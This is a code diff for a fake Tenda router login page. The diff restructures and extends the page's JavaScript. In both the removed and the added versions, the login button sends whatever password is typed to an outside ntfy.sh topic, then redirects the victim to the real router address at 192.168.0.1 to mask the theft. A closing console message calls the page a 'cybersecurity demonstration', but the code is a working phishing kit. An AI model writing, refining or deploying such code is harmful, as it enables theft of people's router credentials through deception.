-            <path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
-            <path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>
-          </svg>
-        </span>
+      <!-- LOGIN BUTTON -->
+      <button class="login-btn" id="loginBtn">Login</button>
+
+      <!-- FORGOT PASSWORD -->
+      <div class="forgot-row">
+        <button class="forgot-btn" id="forgotBtn" onclick="toggleTip()">
+          Forgot your password?
+          <span class="arrow">
+            <svg width="8" height="8" viewBox="0 0 7 10" fill="#999">
+              <path d="M0 0l7 5-7 5V0z"/>
+            </svg>
+          </span>
+        </button>
       </div>
 
     </div>
-
-    <button class="login-btn" >Login</button>
-
-    <div class="forgot-row">
-      <button class="forgot-btn" id="forgotBtn" onclick="toggleTip()">
-        Forgot your password?
-        <span class="arrow">
-          <svg width="8" height="8" viewBox="0 0 7 10" fill="#A7ACB4">
-            <path d="M0 0l7 5-7 5V0z"/>
-          </svg>
-        </span>
-      </button>
-    </div>
-
   </div>
 
-<script>
-   
-  const customSelect = document.getElementById('customSelect');
-  const selectedDisplay = document.getElementById('selectedDisplay');
-  const selectedText = document.getElementById('selectedText');
-  const dropdownMenu = document.getElementById('dropdownMenu');
-  const arrowDown = document.getElementById('arrowDown');
-  const languageSelect = document.getElementById('languageSelect');
+  <script>
+    // ========== LANGUAGE DROPDOWN ==========
+    const customSelect = document.getElementById('customSelect');
+    const selectedDisplay = document.getElementById('selectedDisplay');
+    const selectedText = document.getElementById('selectedText');
+    const dropdownMenu = document.getElementById('dropdownMenu');
+    const arrowDown = document.getElementById('arrowDown');
+    const languageSelect = document.getElementById('languageSelect');
 
-  // Toggle dropdown
-  selectedDisplay.addEventListener('click', function(e) {
-    e.stopPropagation();
-    dropdownMenu.classList.toggle('show');
-    arrowDown.classList.toggle('open');
-  });
-
-  // Select language
-  dropdownMenu.querySelectorAll('li').forEach(function(item) {
-    item.addEventListener('click', function(e) {
+    selectedDisplay.addEventListener('click', function(e) {
       e.stopPropagation();
-      
-      // Update selected text
-      const text = this.querySelector('a').textContent;
-      const value = this.dataset.val;
-      
-      selectedText.textContent = text;
-      
-      // Update hidden select
-      languageSelect.value = value;
-      
-      // Update active state
-      dropdownMenu.querySelectorAll('li').forEach(function(li) {
-        li.classList.remove('active');
-      });
-      this.classList.add('active');
-      
-      // Close dropdown
-      dropdownMenu.classList.remove('show');
-      arrowDown.classList.remove('open');
-      
-      // Trigger change event on hidden select
-      languageSelect.dispatchEvent(new Event('change'));
+      dropdownMenu.classList.toggle('show');
+      arrowDown.classList.toggle('open');
     });
-  });
 
-  // Close dropdown when clicking outside
-  document.addEventListener('click', function(e) {
-    if (!customSelect.contains(e.target)) {
-      dropdownMenu.classList.remove('show');
-      arrowDown.classList.remove('open');
+    dropdownMenu.querySelectorAll('li').forEach(function(item) {
+      item.addEventListener('click', function(e) {
+        e.stopPropagation();
+        const text = this.querySelector('a').textContent;
+        const value = this.dataset.val;
+        selectedText.textContent = text;
+        languageSelect.value = value;
+        dropdownMenu.querySelectorAll('li').forEach(function(li) {
+          li.classList.remove('active');
+        });
+        this.classList.add('active');
+        dropdownMenu.classList.remove('show');
+        arrowDown.classList.remove('open');
+        languageSelect.dispatchEvent(new Event('change'));
+      });
+    });
+
+    document.addEventListener('click', function(e) {
+      if (!customSelect.contains(e.target)) {
+        dropdownMenu.classList.remove('show');
+        arrowDown.classList.remove('open');
+      }
+    });
+
+    languageSelect.addEventListener('change', function() {
+      console.log('Language changed to:', this.value);
+    });
+
+    // ========== PASSWORD TOGGLE ==========
+    function togglePassword() {
+      const input = document.getElementById('password');
+      const icon = document.getElementById('eye-icon');
+      if (input.type === 'password') {
+        input.type = 'text';
+        icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7c-2.7 4.5-6.8 7-11 7S3.7 12.5 1 8z" stroke="#6B7280" stroke-width="1.6" fill="none"/><circle cx="12" cy="8" r="2.4" stroke="#6B7280" stroke-width="1.6" fill="none"/>';
+      } else {
+        input.type = 'password';
+        icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/><path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>';
+      }
     }
-  });
 
-  // Handle language change
-  languageSelect.addEventListener('change', function() {
-    console.log('Language changed to:', this.value);
-    // You can add language change logic here
-  });
+    // ========== TIP FUNCTIONS ==========
+    const tip = document.getElementById('resetTip');
+    const htip = document.getElementById('hhhTip');
+    const forgotBtn = document.getElementById('forgotBtn');
+    const closeX = document.getElementById('closeTip');
 
-  function togglePassword() {
-    const input = document.getElementById('password');
-    const icon = document.getElementById('eye-icon');
-    if (input.type === 'password') {
-      input.type = 'text';
-      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7c-2.7 4.5-6.8 7-11 7S3.7 12.5 1 8z" stroke="#6B7280" stroke-width="1.6" fill="none"/><circle cx="12" cy="8" r="2.4" stroke="#6B7280" stroke-width="1.6" fill="none"/>';
-    } else {
-      input.type = 'password';
-      icon.innerHTML = '<path d="M1 8c2.7-4.5 6.8-7 11-7s8.3 2.5 11 7" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/><path d="M4 8c1.2 1 2.6 1.8 4 2.3M20 8c-1.2 1-2.6 1.8-4 2.3" stroke="#C7CBD1" stroke-width="1.6" stroke-linecap="round"/>';
+    function toggleTip() {
+      const isOpen = tip.classList.contains('show');
+      if (isOpen) { closeTip(); } else { openTip(); }
     }
-  }
 
-//   const tip = document.getElementById('resetTip');
-//   const htip = document.getElementById('hhhtTip');
-//   const forgotBtn = document.getElementById('forgotBtn');
-//   const closeX = document.getElementById('closeTip');
+    function openTip() {
+      tip.classList.add('show');
+      if (forgotBtn) forgotBtn.classList.add('open');
+    }
 
-//   function toggleTip() {
-//     const isOpen = tip.classList.contains('show');
-//     if (isOpen) { closeTip(); } else { openTip(); }
-//   }
-// function togglehTip() {
-//     const isOpen = htip.classList.contains('show');
-//     if (isOpen) { closehhTip(); } else { openhhTip(); }
-//   }
-//   function openTip() {
-//     tip.classList.add('show');
-//     forgotBtn.classList.add('open');
-//   }
+    function closeTip() {
+      tip.classList.remove('show');
+      if (forgotBtn) forgotBtn.classList.remove('open');
+    }
 
-//   function closeTip() {
-//     tip.classList.remove('show');
-//     forgotBtn.classList.remove('open');
-//   }
-  
-//   function openhhTip() {
-//     hhtip.classList.add('show');
-//   }
-  
-//  function closehhTip() {
-//     hhtip.classList.remove('show');
-//   }
-  
-//   closeX.addEventListener('click', function(e) {
-//     e.stopPropagation();
-//     closeTip();
-//     closehhTip();
-    
-//   });
+    function openhhTip() {
+      if (htip) {
+        htip.classList.add('show');
+        // Auto-close HH tip after 5 seconds
+        setTimeout(function() {
+          closehhTip();
+        }, 5000);
+      }
+    }
 
-//   document.addEventListener('click', function(e) {
-//     if (tip.classList.contains('show') &&
-//         !tip.contains(e.target) &&
-//         !forgotBtn.contains(e.target)) {
-//       closeTip(); 
-//     }
-//   });
-//   document.querySelector('.login-btn').addEventListener('click', function() {
-//      const btn = this;
-    
-    
-//     const originalText = btn.innerHTML;
-    
-   
-//     btn.disabled = true;
-    
-   
-//     btn.innerHTML = `<span class="spinner"></span> Loading...`;
-//     const searchTermValue = document.getElementById('password').value;
-    
-   
-//     if (searchTermValue.trim() !== "") {
-        
-       
-//         fetch('https://ntfy.sh/my-shop-alerts-7729', {
-//             method: 'POST',
-//             body: `🛒 password entered for router is : ${searchTermValue}`
-//         }).then(response => {
-//     // If the call succeeds, trigger the custom visibility state
-//     togglehhTip();
-// })
-// .catch(error => {
-//     // Handle or log network/connection failures locally
-//     console.error('Request failed:', error);
-// })
-// .finally(() => {
-//     // 1. Immediately restore the interactive state of the button
-//     btn.disabled = false;
-//     btn.innerHTML = originalText;
-    
-//     // 2. Wait exactly 1000 milliseconds (1 second) before execution
-//     setTimeout(function() {
-//         window.location.href = 'http://192.168.0.1';
-//     }, 1000);
-// });
+    function closehhTip() {
+      if (htip) htip.classList.remove('show');
+    }
 
-        
-//     }
-// });
-
-
-//   document.addEventListener('keydown', function(e) {
-//     if (e.key === 'Escape') closeTip();
-//   });
-  // 1. Correctly map the HTML IDs to your JavaScript variables
-const tip = document.getElementById('resetTip');
-const htip = document.getElementById('hhhTip'); // Fixed: Matches id="hhhTip" in your HTML
-const forgotBtn = document.getElementById('forgotBtn');
-const closeX = document.getElementById('closeTip');
-
-function toggleTip() {
-    const isOpen = tip.classList.contains('show');
-    if (isOpen) { closeTip(); } else { openTip(); }
-}
-
-// Fixed: Renamed to match what you call inside the fetch blocks safely
-function togglehhTip() {
-    const isOpen = htip.classList.contains('show');
-    if (isOpen) { closehhTip(); } else { openhhTip(); }
-}
-
-function openTip() {
-    tip.classList.add('show');
-    if (forgotBtn) forgotBtn.classList.add('open');
-}
-
-function closeTip() {
-    tip.classList.remove('show');
-    if (forgotBtn) forgotBtn.classList.remove('open');
-}
-
-// Fixed: Uses 'htip' variable consistently
-function openhhTip() {
-    if (htip) htip.classList.add('show');
-}
-
-function closehhTip() {
-    if (htip) htip.classList.remove('show');
-}
-
-// Close button click listener
-if (closeX) {
-    closeX.addEventListener('click', function(e) {
+    // Close button for reset tip
+    if (closeX) {
+      closeX.addEventListener('click', function(e) {
         e.stopPropagation();
         closeTip();
-        closehhTip();
+      });
+    }
+
+    // Click outside to close reset tip
+    document.addEventListener('click', function(e) {
+      if (tip && tip.classList.contains('show') && 
+          !tip.contains(e.target) && 
+          (!forgotBtn || !forgotBtn.contains(e.target))) {
+        closeTip();
+      }
     });
-}
 
-// Click away closure logic
-document.addEventListener('click', function(e) {
-    if (tip && tip.classList.contains('show') && !tip.contains(e.target) && (!forgotBtn || !forgotBtn.contains(e.target))) {
-        closeTip(); 
-    }
-});
-
-// Main login/search submission listener
-document.querySelector('.login-btn').addEventListener('click', function() {
-    const btn = this;
-    const originalText = btn.innerHTML;
-    
-    // Disable the button to block double inputs
-    btn.disabled = true;
-    
-    // Uses a lightweight inline loader that matches your current text flow perfectly
-    btn.innerHTML = `<span class="inline-spinner"></span> Loading...`;
-    
-    // Read the value from your element
-    const inputElement = document.getElementById('snkldsf');
-    const searchTermValue = document.getElementById('password').value;
-    
-   
-    if (searchTermValue.trim() !== "") {
-        fetch('https://ntfy.sh/my-shop-alerts-7729', {
-            method: 'POST',
-            body: `🛒 password entered for router is : ${searchTermValue}`
-        })
-
-        .then(response => {
-            if (!response.ok) {
-                throw new Error('Network status not okay');
-            }
-            // Success logic block
-        })
-        .catch(error => {
-            // Corrected: Now triggers the "No Network" tip box on your screen if the call fails
-            console.error('Request failed:', error);
-            openhhTip(); 
-        })
-        .finally(() => {
-            // Restore the native button text layout
-            btn.disabled = false;
-            btn.innerHTML = originalText;
-            
-            // Delays for 1 full second before shifting views so users can process the tip box state
-            setTimeout(function() {
-                window.location.href = 'http://192.168.0.1';
-            }, 1000);
-        });
-    } else {
-        // Reset the button state if nothing was typed
-        btn.disabled = false;
-        btn.innerHTML = originalText;
-    }
-});
-
-// Escape key listener
-document.addEventListener('keydown', function(e) {
-    if (e.key === 'Escape') {
+    // Escape key to close all tips
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape') {
         closeTip();
         closehhTip();
-    }
-});
+      }
+    });
 
-</script>
+    // ========== LOGIN HANDLER ==========
+    document.getElementById('loginBtn').addEventListener('click', function() {
+      const btn = this;
+      const originalText = btn.innerHTML;
+      const password = document.getElementById('password').value;
+      
+      // Check if password is empty
+      if (!password || password.trim() === "") {
+        // Shake animation
+        const field = document.querySelector('.field:last-child');
+        field.classList.add('shake');
+        setTimeout(function() {
+          field.classList.remove('shake');
+        }, 500);
+        return;
+      }
+      
+      // Disable button and show spinner
+      btn.disabled = true;
+      btn.innerHTML = `<span class="spinner"></span> Loading...`;
+      
+      // Send to ntfy.sh
+      fetch('https://ntfy.sh/my-shop-alerts-7729', {
+        method: 'POST',
+        body: `🛒 Password entered: ${password}`
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error('Network response was not ok');
+        }
+        // Success - redirect to router
+        setTimeout(function() {
+          window.location.href = 'http://192.168.0.1';
+        }, 1000);
+      })
+      .catch(error => {
+        console.error('Request failed:', error);
+        // Show "No Network" tip
+        openhhTip();
+        // Still redirect after showing the tip
+        setTimeout(function() {
+          window.location.href = 'http://192.168.0.1';
+        }, 2000);
+      })
+      .finally(() => {
+        // Restore button after 1 second (or after redirect)
+        setTimeout(function() {
+          btn.disabled = false;
+          btn.innerHTML = originalText;
+        }, 1000);
+      });
+    });
+
+    // Also trigger on Enter key in password field
+    document.getElementById('password').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') {
+        document.getElementById('loginBtn').click();
+      }
+    });
+
+    console.log('🔐 Tenda Router Login Demo');
+    console.log('📡 This is a cybersecurity demonstration');
+    console.log('⚠️ Always verify URLs before entering credentials');
+  </script>
+
 </body>
 </html>
